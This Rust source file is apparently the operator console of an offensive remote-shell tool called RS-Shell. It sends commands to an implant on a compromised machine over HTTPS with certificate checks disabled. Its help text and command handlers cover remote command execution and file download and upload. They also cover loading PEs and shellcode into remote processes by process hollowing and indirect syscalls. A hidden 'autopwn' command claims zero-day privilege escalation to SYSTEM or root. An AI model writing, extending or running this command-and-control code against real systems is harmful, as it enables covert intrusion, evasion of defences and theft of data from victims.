use reqwest::{blocking::multipart, blocking::Client};
use std::{
    error::Error,
    io::{self, Write},
    path::Path,
};

use crate::autopwn;

pub fn operator(ip_addr: &str) -> Result<(), Box<dyn Error>> {
    // HTTPS client without certificate verification
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let mut url = format!("https://{}/rs-shell/index", ip_addr);
    // Connect to the server and get the banner
    let mut response = client.get(url).send()?;

    if response.status().is_success() {
        let body = response.text()?;
        println!("{}", body);
        log::info!("[+] Connection success to {} ! BANG BANG !", ip_addr);
        log::info!("[+] This shell is yours !");
        log::info!("[+] Type 'help' for advanced integrated commands");

        // Retrieve the implant's OS
        let mut _implant_os = String::new();
        url = format!("https://{}/rs-shell/upload./os.txt", ip_addr);
        response = client.get(url).send()?;
        if response.status().is_success() {
            _implant_os = response.text()?;
            log::info!("[+] Implant's OS family is {}", _implant_os)
        } else {
            _implant_os = "undefined".to_string();
            log::warn!("Cannot read implant OS : {}", response.status());
        }

        // Ctrl+C handler to avoid kill the shell by error
        ctrlc::set_handler(move || {
            println!(
                "Ctrl+C handled. Type 'quit' or 'exit' to quit, or kill the process manually."
            );
        })
        .expect("Error setting Ctrl-C handler");

        // Command loop
        loop {
            print!("> ");
            io::stdout().flush().unwrap();
            let mut cmd = String::new();
            io::stdin().read_line(&mut cmd).expect("[-] Input issue");
            cmd.push('\0');

            // Check for help command
            if cmd.as_str().starts_with("help") {
                println!("{}", https_help());
                continue;
            }

            // Cmd handling
            if cmd.trim_end_matches('\0').trim_end().ne("") {
                // Check for download/upload commands
                if cmd.as_str().starts_with("download") {
                    let path: Vec<&str> = cmd.split(' ').collect();
                    if path.len() != 2 {
                        log::warn!(
                            "Invalid argument number. Usage is : download C:\\file\\to\\download"
                        );
                    } else {
                        url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                        log::info!("Downloading file : {}", path[1]);
                        response = client
                            .post(url)
                            .body(format!("download:{}", path[1]))
                            .send()?;

                        if response.status().is_success() {
                            let body = response.text()?;
                            log::info!("{}", body);
                        } else {
                            log::error!("RS-Shell error: {}", response.status());
                        }
                    }
                    continue;
                } else if cmd.as_str().starts_with("upload") {
                    let path: Vec<&str> = cmd.split(' ').collect();
                    if path.len() != 2 {
                        log::warn!(
                            "Invalid argument number. Usage is : upload C:\\file\\to\\upload"
                        );
                    } else {
                        log::info!("Uploading file : {}", path[1]);
                        /*
                            Uploading file on the server before uploading it on the target machine
                            To avoid creating a new function, we will reuse the 'download' route to upload the shellcode file on the server (see explain in the comment in the 'route.rs' file)
                        */
                        url = format!("https://{}/", ip_addr);
                        match multipart::Form::new()
                            .file("file", path[1].trim_end_matches("\r\n\0"))
                        {
                            Ok(form) => {
                                response = client.post(url).multipart(form).send()?;

                                if response.status().is_success() {
                                    let filename = Path::new(path[1].trim())
                                        .file_name()
                                        .unwrap()
                                        .to_str()
                                        .unwrap();
                                    let file_path = format!("./downloads/{}", filename);
                                    url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                                    response = client
                                        .post(url)
                                        .body(format!("upload:{}", file_path))
                                        .send()?;

                                    if response.status().is_success() {
                                        let body = response.text()?;
                                        log::info!("{}", body);
                                    } else {
                                        log::error!("RS-Shell error: {}", response.status());
                                    }
                                }
                            }
                            Err(e) => log::debug!("Error: {}", e),
                        }
                    }
                    continue;
                } else if cmd.as_str().starts_with("load -h")
                    || cmd.as_str().starts_with("load -s")
                    || cmd.as_str().starts_with("syscalls -h")
                    || cmd.as_str().starts_with("syscalls -s")
                {
                    if _implant_os.ne("windows") {
                        log::warn!(
                            "Client's OS is not Windows, this command doesn't make any sense"
                        );
                        continue;
                    }
                    let path: Vec<&str> = cmd.split(' ').collect();
                    if path.len() != 4 {
                        log::warn!("Invalid argument number. Usage is : {} -h|-s C:\\path\\to\\file_to_inject C:\\path\\to\\process_to_start", path[0]);
                    } else {
                        // In case of shellcode injection, the implant will load it from the server and execute it without touching the disk
                        // So we need to upload the shellcode file on the server first
                        if cmd.as_str().starts_with("load -s")
                            || cmd.as_str().starts_with("syscalls -s")
                        {
                            log::info!(
                                "Sending shellcode file {:?} to the server",
                                path[1].trim_end_matches("\r\n\0")
                            );
                            /*
                                Uploading shellcode file on the server
                                To avoid creating a new function, we will reuse the 'download' route to upload the shellcode file on the server (see explain in the comment in the 'route.rs' file)
                            */
                            url = format!("https://{}/", ip_addr);
                            match multipart::Form::new()
                                .file("file", path[2].trim_end_matches("\r\n\0"))
                            {
                                Ok(form) => {
                                    response = client.post(url).multipart(form).send()?;

                                    if response.status().is_success() {
                                        log::info!("Shellcode file uploaded in the 'downloads' directory on the server");
                                        let filename = Path::new(path[2].trim())
                                            .file_name()
                                            .unwrap()
                                            .to_str()
                                            .unwrap();
                                        let file_path = format!("./downloads/{}", filename);

                                        // Sending the command to the implant
                                        url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                                        log::info!(
                                            "Loading shellcode into a remote process memory"
                                        );
                                        response = client
                                            .post(url)
                                            .body(format!(
                                                "{} {}:{} {}",
                                                path[0], path[1], file_path, path[3]
                                            ))
                                            .send()?;

                                        if response.status().is_success() {
                                            let body = response.text()?;
                                            log::info!("{}", body);
                                        } else {
                                            log::error!("RS-Shell error: {}", response.status());
                                        }
                                    } else {
                                        log::error!("RS-Shell error: {}", response.status());
                                    }
                                }
                                Err(e) => log::debug!("Error: {}", e),
                            }
                        } else {
                            // In case of PE injection with process hollowing
                            url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                            log::info!("Loading {} into {}", path[0], path[1]);
                            response = client
                                .post(url)
                                .body(format!("{} {}:{} {}", path[0], path[1], path[2], path[3]))
                                .send()?;

                            if response.status().is_success() {
                                let body = response.text()?;
                                log::info!("{}", body);
                            } else {
                                log::error!("RS-Shell error: {}", response.status());
                            }
                        }
                    }
                    continue;
                } else if cmd.as_str().starts_with("load ") || cmd.as_str().starts_with("syscalls ")
                {
                    if _implant_os.ne("windows") {
                        log::warn!(
                            "Client's OS is not Windows, this command doesn't make any sense"
                        );
                        continue;
                    }
                    let path: Vec<&str> = cmd.split(' ').collect();
                    if path.len() != 2 {
                        log::warn!(
                            "Invalid argument number. Usage is : {} C:\\path\\to\\file_to_inject",
                            path[0]
                        );
                    } else {
                        log::info!("Loading PE into the implant memory");
                        url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                        response = client
                            .post(url)
                            .body(format!("{}:{}", path[0], path[1]))
                            .send()?;

                        if response.status().is_success() {
                            let body = response.text()?;
                            log::info!("{}", body);
                        } else {
                            log::error!("RS-Shell error: {}", response.status());
                        }
                    }
                    continue;
                } else if cmd.as_str().starts_with("autopwn") {
                    print!("What is the meaning of life ? ");
                    io::stdout().flush().unwrap();
                    let mut life = String::new();
                    io::stdin().read_line(&mut life).expect("[-] Input issue");
                    if life
                        .trim_end_matches('\0')
                        .trim_end()
                        .eq_ignore_ascii_case("42")
                    {
                        autopwn::autopwn();
                        continue;
                    }
                    continue;
                } else if cmd.as_str().starts_with("exit") || cmd.as_str().starts_with("quit") {
                    url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                    response = client.post(url).body(cmd).send()?;

                    if response.status().is_success() {
                        println!("[+] Goodbye my friend <3");
                        break;
                    } else {
                        log::error!("RS-Shell error: {}", response.status());
                    }
                    continue;
                } else {
                    // To run a cmd command
                    url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                    response = client.post(url).body(format!("cmd:{}", cmd)).send()?;

                    if response.status().is_success() {
                        let body = response.text()?;
                        println!("{}", body);
                    } else {
                        log::error!("RS-Shell error: {}", response.status());
                    }
                }
            }
        }
    } else {
        log::error!("RS-Shell server cannot be reached: {}", response.status());
    }

    Ok(())
}

fn https_help() -> String {
    "[+] Custom integrated commands :

    [+] Loading commands
    > load C:\\path\\to\\PE_to_load
        load a PE file in the client process memory and executes it. This will kill the implant !
    > load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
        load a PE file in a remote process memory with process hollowing and executes it
    > load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
        load a shellcode in a remote process memory and start a new thread with it

    [+] Loading commands with indirect syscalls
    > syscalls C:\\path\\to\\PE_to_load
        load a PE file in the client process memory and executes it, with indirect syscalls. This will kill the reverse shell !
    > syscalls -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
        load a PE file in a remote process memory with process hollowing and executes it, with indirect syscalls
    > syscalls -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
        load a shellcode in a remote process memory and start a new thread with it, with indirect syscalls

    [+] Network commands
    > download C:\\file\\to\\download
        download a file from the remote system and store it on the server
    > upload C:\\local\\file\\to\\upload
        upload a file from the operator machine to the remote system

    [+] Special commands
    > autopwn
        escalate to the SYSTEM or root account from any local account by exploiting a zero day
    ".to_string()
}
